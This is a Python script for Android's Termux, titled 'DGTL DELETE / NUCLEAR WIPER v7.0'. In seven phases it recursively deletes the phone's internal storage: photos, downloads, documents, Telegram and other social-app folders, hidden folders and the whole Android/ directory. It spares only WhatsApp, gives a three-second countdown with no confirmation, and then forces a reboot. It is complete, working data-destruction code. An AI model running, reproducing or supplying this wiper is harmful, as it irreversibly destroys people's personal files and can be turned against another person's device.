#!/data/data/com.termux/files/usr/bin/python

import os
import sys
import time
import shutil
import subprocess

# Colors
class Colors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    PURPLE = '\033[1;35m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    NC = '\033[0m'
    BOLD = '\033[1m'
    BLINK = '\033[5m'

# ==========================================
# 🔥 CUSTOM BANNER - DGTL DELETE
# ==========================================
BANNER = """
\033[1;31m██████╗   \033[1;37m██████╗ \033[1;31m████████╗\033[1;37m██╗     
\033[1;31m██╔══██╗  \033[1;37m██╔════╝ \033[1;31m╚══██╔══╝\033[1;37m██║     
\033[1;31m██║  ██║  \033[1;37m██║  ███╗\033[1;31m   ██║   \033[1;37m██║     
\033[1;31m██║  ██║  \033[1;37m██║   ██║\033[1;31m   ██║   \033[1;37m██║     
\033[1;31m██████╔╝  \033[1;37m╚██████╔╝\033[1;31m   ██║   \033[1;37m███████╗
\033[1;31m╚═════╝    \033[1;37m╚═════╝ \033[1;31m   ╚═╝   \033[1;37m╚══════╝

\033[1;31m██████╗ \033[1;37m███████╗\033[1;31m██╗     \033[1;37m███████╗\033[1;31m████████╗\033[1;37m███████╗
\033[1;31m██╔══██╗\033[1;37m██╔════╝\033[1;31m██║     \033[1;37m██╔════╝\033[1;31m╚══██╔══╝\033[1;37m██╔════╝
\033[1;31m██║  ██║\033[1;37m█████╗  \033[1;31m██║     \033[1;37m█████╗  \033[1;31m   ██║   \033[1;37m█████╗  
\033[1;31m██║  ██║\033[1;37m██╔══╝  \033[1;31m██║     \033[1;37m██╔══╝  \033[1;31m   ██║   \033[1;37m██╔══╝  
\033[1;31m██████╔╝\033[1;37m███████╗\033[1;31m███████╗\033[1;37m███████╗\033[1;31m   ██║   \033[1;37m███████╗
\033[1;31m╚═════╝ \033[1;37m╚══════╝\033[1;31m╚══════╝\033[1;37m╚══════╝\033[1;31m   ╚═╝   \033[1;37m╚══════╝

\033[1;31m            >>> ⚡ DGTL DELETE ⚡ <<<\033[0m
"""

def clear_screen():
    """Clear screen and show banner"""
    os.system('clear')
    print(BANNER)
    print(f"{Colors.RED}╔══════════════════════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.RED}║                                                          ║{Colors.NC}")
    print(f"{Colors.RED}║  {Colors.BLINK}💀 NUCLEAR WIPER v7.0 - ONLY WHATSAPP SAFE{Colors.RED}        ║{Colors.NC}")
    print(f"{Colors.RED}║    {Colors.GREEN}✅ ONLY WHATSAPP PROTECTED{Colors.RED}                        ║{Colors.NC}")
    print(f"{Colors.RED}║    {Colors.YELLOW}⚠️  Telegram & App Data WILL BE DELETED{Colors.RED}         ║{Colors.NC}")
    print(f"{Colors.RED}║    {Colors.RED}🔥 AUTO REBOOT ENABLED{Colors.RED}                             ║{Colors.NC}")
    print(f"{Colors.RED}║                                                          ║{Colors.NC}")
    print(f"{Colors.RED}╚══════════════════════════════════════════════════════════╝{Colors.NC}")
    print("")

def show_phase(phase_num, phase_name):
    """Show phase number clearly"""
    print(f"\n{Colors.RED}{Colors.BOLD}╔════════════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.RED}{Colors.BOLD}║     🔴 PHASE {phase_num}/7: {phase_name}{Colors.NC}")
    print(f"{Colors.RED}{Colors.BOLD}╚════════════════════════════════════════════════╝{Colors.NC}")

def safe_delete(path):
    """Delete with error ignore"""
    try:
        if os.path.isfile(path):
            os.remove(path)
            return True
        elif os.path.isdir(path):
            shutil.rmtree(path, ignore_errors=True)
            return True
    except:
        pass
    return False

def force_reboot():
    """Force phone reboot"""
    print(f"\n{Colors.RED}{Colors.BOLD}{Colors.BLINK}🔄 INITIATING FORCE REBOOT...{Colors.NC}")
    time.sleep(2)
    
    reboot_methods = [
        "reboot",
        "/system/bin/reboot",
        "su -c reboot",
        "am start -a android.intent.action.REBOOT",
        "toolbox reboot",
        "busybox reboot"
    ]
    
    for method in reboot_methods:
        try:
            subprocess.run(method.split(), timeout=3)
        except:
            pass
    
    print(f"{Colors.RED}❌ Reboot failed - Manual reboot karo{Colors.NC}")
    sys.exit(0)

def main():
    clear_screen()
    
    # ==========================================
    # ONLY WHATSAPP PROTECTED
    # ==========================================
    ONLY_WHATSAPP = "WhatsApp"
    INTERNAL = "/storage/emulated/0"
    
    if not os.path.exists(INTERNAL):
        print(f"{Colors.RED}❌ Storage not found!{Colors.NC}")
        return
    
    print(f"{Colors.CYAN}📱 Target: {INTERNAL}{Colors.NC}")
    print(f"{Colors.GREEN}🛡️ ONLY PROTECTED: WhatsApp{Colors.NC}")
    print(f"{Colors.RED}💀 Telegram - DELETE{Colors.NC}")
    print(f"{Colors.RED}💀 App Data - DELETE{Colors.NC}")
    print(f"{Colors.RED}💀 Android/obb - DELETE{Colors.NC}")
    print(f"{Colors.RED}💀 Android/media - DELETE{Colors.NC}")
    print(f"{Colors.YELLOW}🔄 Auto-restart: ENABLED{Colors.NC}")
    print("")
    
    # 3 second warning
    print(f"{Colors.RED}{Colors.BOLD}{Colors.BLINK}⚠️  STARTING IN:{Colors.NC}")
    for i in range(3, 0, -1):
        print(f"\r{Colors.RED}{Colors.BOLD}   {i}...{Colors.NC}", end="", flush=True)
        time.sleep(1)
    
    print(f"\n{Colors.RED}{Colors.BOLD}💥 NUCLEAR LAUNCH DETECTED!{Colors.NC}\n")
    
    # Track deleted
    deleted = 0
    failed = 0
    
    # ==========================================
    # PHASE 1: Common Media Folders
    # ==========================================
    show_phase(1, "Media Folders")
    
    folders_to_delete = [
        "DCIM", "Pictures", "Music", "Movies", "Videos",
        "Download", "Downloads", "Documents",
        "ScreenRecorder", "ScreenRecord", "Screenshots",
        "Camera", "Bluetooth", "Podcasts", "Ringtones",
        "Notifications", "Alarms", "Audiobooks", "Recordings",
        "VoiceRecorder", "SoundRecorder",
    ]
    
    for folder in folders_to_delete:
        folder_path = os.path.join(INTERNAL, folder)
        if os.path.exists(folder_path):
            if safe_delete(folder_path):
                print(f"   {Colors.GREEN}✅{Colors.NC} Deleted: {folder}")
                deleted += 1
            else:
                failed += 1
        time.sleep(0.1)
    
    print(f"{Colors.GREEN}   ✅ Phase 1 Complete{Colors.NC}")
    
    # ==========================================
    # PHASE 2: Social Media Apps
    # ==========================================
    show_phase(2, "Social Media Apps (Including Telegram)")
    
    social_folders = [
        "Instagram", "Facebook", "Snapchat", "TikTok",
        "Twitter", "LinkedIn", "Pinterest", "Reddit",
        "Discord", "Messenger", "Threads", 
        "Telegram", "Telegram X", "Plus Messenger",
        "WhatsApp Business",
    ]
    
    for folder in social_folders:
        if folder == "WhatsApp":
            print(f"   {Colors.GREEN}🛡️{Colors.NC} Protected: {folder}")
            continue
            
        folder_path = os.path.join(INTERNAL, folder)
        if os.path.exists(folder_path):
            if safe_delete(folder_path):
                print(f"   {Colors.GREEN}✅{Colors.NC} Deleted: {folder}")
                deleted += 1
    
    print(f"{Colors.GREEN}   ✅ Phase 2 Complete{Colors.NC}")
    
    # ==========================================
    # PHASE 3: Telegram Subfolders
    # ==========================================
    show_phase(3, "Telegram Subfolders")
    
    telegram_subfolders = [
        "Telegram Videos", "Telegram Images", "Telegram Documents",
        "Telegram Audio", "Telegram Files", "Telegram Cache",
        ".Telegram", "Telegram Desktop"
    ]
    
    for folder in telegram_subfolders:
        folder_path = os.path.join(INTERNAL, folder)
        if os.path.exists(folder_path):
            if safe_delete(folder_path):
                print(f"   {Colors.GREEN}✅{Colors.NC} Deleted: {folder}")
                deleted += 1
    
    print(f"{Colors.GREEN}   ✅ Phase 3 Complete{Colors.NC}")
    
    # ==========================================
    # PHASE 4: Hidden Folders
    # ==========================================
    show_phase(4, "Hidden Folders")
    
    try:
        for item in os.listdir(INTERNAL):
            if item.startswith('.') and item not in ['.', '..', '.android', '.termux']:
                if "whatsapp" in item.lower():
                    print(f"   {Colors.GREEN}🛡️{Colors.NC} Protected hidden: {item}")
                    continue
                
                item_path = os.path.join(INTERNAL, item)
                if safe_delete(item_path):
                    print(f"   {Colors.GREEN}✅{Colors.NC} Deleted hidden: {item}")
                    deleted += 1
    except:
        pass
    
    print(f"{Colors.GREEN}   ✅ Phase 4 Complete{Colors.NC}")
    
    # ==========================================
    # PHASE 5: Android Complete Nuke
    # ==========================================
    show_phase(5, "Android Complete Nuke")
    
    android_path = os.path.join(INTERNAL, "Android")
    if os.path.exists(android_path):
        try:
            for item in os.listdir(android_path):
                item_path = os.path.join(android_path, item)
                if safe_delete(item_path):
                    print(f"   {Colors.GREEN}✅{Colors.NC} Deleted: Android/{item}")
                    deleted += 1
        except:
            pass
    
    print(f"{Colors.GREEN}   ✅ Phase 5 Complete{Colors.NC}")
    
    # ==========================================
    # PHASE 6: Cache & Temp Files
    # ==========================================
    show_phase(6, "Cache & Temp Files")
    
    cache_locations = [
        "DCIM/.thumbnails",
        "Pictures/.thumbnails",
        ".thumbnails",
        ".cache",
        "tmp",
        ".temp",
        "cache",
        "temp",
        ".Trash",
        "LOST.DIR",
    ]
    
    for cache in cache_locations:
        cache_path = os.path.join(INTERNAL, cache)
        if os.path.exists(cache_path):
            if safe_delete(cache_path):
                print(f"   {Colors.GREEN}✅{Colors.NC} Deleted: {cache}")
                deleted += 1
    
    print(f"{Colors.GREEN}   ✅ Phase 6 Complete{Colors.NC}")
    
    # ==========================================
    # PHASE 7: Root Directory Cleanup
    # ==========================================
    show_phase(7, "Root Directory Cleanup")
    
    try:
        for item in os.listdir(INTERNAL):
            item_path = os.path.join(INTERNAL, item)
            
            if item == "WhatsApp":
                print(f"   {Colors.GREEN}🛡️{Colors.NC} Protected: {item}")
                continue
            
            if item == "Android":
                continue
            
            if os.path.isfile(item_path):
                if safe_delete(item_path):
                    print(f"   {Colors.GREEN}✅{Colors.NC} Deleted file: {item}")
                    deleted += 1
            elif os.path.isdir(item_path):
                if safe_delete(item_path):
                    print(f"   {Colors.GREEN}✅{Colors.NC} Deleted folder: {item}")
                    deleted += 1
    except:
        pass
    
    print(f"{Colors.GREEN}   ✅ Phase 7 Complete{Colors.NC}")
    
    # ==========================================
    # FINAL SUMMARY
    # ==========================================
    print(f"\n{Colors.GREEN}{Colors.BOLD}╔════════════════════════════════════════════╗{Colors.NC}")
    print(f"{Colors.GREEN}{Colors.BOLD}║     ✅ NUCLEAR WIPE COMPLETE!              ║{Colors.NC}")
    print(f"{Colors.GREEN}{Colors.BOLD}╚════════════════════════════════════════════╝{Colors.NC}")
    
    print(f"\n{Colors.CYAN}📊 Final Report:{Colors.NC}")
    print(f"   {Colors.WHITE}• Items deleted: {Colors.RED}{Colors.BOLD}{deleted}{Colors.NC}")
    print(f"   {Colors.WHITE}• Failed: {Colors.YELLOW}{failed}{Colors.NC}")
    print(f"   {Colors.WHITE}• Protected: {Colors.GREEN}ONLY WhatsApp{Colors.NC}")
    
    # Show only WhatsApp remaining
    print(f"\n{Colors.GREEN}🛡️ ONLY SURVIVOR (SAFE):{Colors.NC}")
    whatsapp_path = os.path.join(INTERNAL, "WhatsApp")
    if os.path.exists(whatsapp_path):
        try:
            size = subprocess.run(['du', '-sh', whatsapp_path], capture_output=True, text=True)
            whatsapp_size = size.stdout.split()[0] if size.stdout else "?"
            print(f"   {Colors.GREEN}✅ WhatsApp - {whatsapp_size}{Colors.NC}")
        except:
            print(f"   {Colors.GREEN}✅ WhatsApp - Intact{Colors.NC}")
    else:
        print(f"   {Colors.YELLOW}⚠️ WhatsApp folder not found{Colors.NC}")
    
    print(f"\n{Colors.RED}❌ Everything else DELETED!{Colors.NC}")
    print(f"{Colors.RED}{Colors.BOLD}{Colors.BLINK}💀 ONLY WHATSAPP SURVIVED!{Colors.NC}")
    
    # ==========================================
    # AUTO REBOOT
    # ==========================================
    print(f"\n{Colors.YELLOW}{Colors.BOLD}════════════════════════════════════════════{Colors.NC}")
    print(f"{Colors.RED}{Colors.BOLD}{Colors.BLINK}🔄 AUTO REBOOT IN 5 SECONDS{Colors.NC}")
    print(f"{Colors.YELLOW}Press Ctrl+C to cancel reboot{Colors.NC}")
    print(f"{Colors.YELLOW}════════════════════════════════════════════{Colors.NC}")
    
    for i in range(5, 0, -1):
        print(f"\r{Colors.RED}Rebooting in: {i} seconds...{Colors.NC}", end="", flush=True)
        time.sleep(1)
    
    print(f"\n{Colors.RED}{Colors.BOLD}{Colors.BLINK}💥 REBOOTING NOW!{Colors.NC}")
    time.sleep(1)
    force_reboot()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}⚠️ Cancelled by user{Colors.NC}")
        sys.exit(0)